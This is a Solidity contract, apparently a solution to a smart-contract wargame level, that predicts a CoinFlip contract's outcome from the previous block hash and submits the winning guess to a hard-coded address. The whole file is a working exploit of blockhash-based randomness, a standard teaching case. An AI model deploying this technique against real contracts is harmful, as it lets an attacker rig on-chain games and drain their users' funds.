// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "./CoinFlip.sol";

contract CoinFlipper {
    using SafeMath for uint256;
    address coinFlipAddress = 0xf67278389ec701e5C84A6b2cE6B5D78e0D7e27c6;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {}

    function flip() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool guess = coinFlip == 1 ? true : false;
        CoinFlip(coinFlipAddress).flip(guess);
    }
}
